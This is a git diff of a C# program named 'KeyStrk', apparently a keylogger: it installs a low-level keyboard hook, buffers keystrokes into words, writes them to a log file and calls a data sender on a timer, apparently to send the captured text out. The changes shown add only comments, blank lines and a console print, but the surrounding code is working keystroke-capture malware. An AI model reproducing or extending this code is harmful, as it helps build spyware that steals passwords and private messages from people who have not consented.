@@ -10,17 +10,20 @@ namespace KeyStrk
 {
     class Program
     {
-
+        //Stuf used to logg input
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+
+        //Initialize wordData string used to store seprate words from user input
         private static String wordData = "";
+   
 
         public static void Main()
         {
-            dataSender dSender = new dataSender();
 
+            dataSender dSender = new dataSender();
             //Create log file if file exists make it blank 
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
             sw.Close();
@@ -84,11 +87,11 @@ namespace KeyStrk
                 if ((Keys)vkCode == Keys.Enter || (Keys)vkCode == Keys.Space || (Keys)vkCode == Keys.Oemcomma || (Keys)vkCode == Keys.OemPeriod)
                 {
                     StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-
+                    
                     sw.Write(wordData + " ");
                     wordData = "";
                     sw.Close();
-
+                    
                 }
                 else
                 {
@@ -152,8 +155,11 @@ namespace KeyStrk
                 {
                     send();
                     startTime = DateTime.Now.Minute;
+                    Console.WriteLine("!");
                 }
-            }  
+            }
+              
+              
             
            
         }
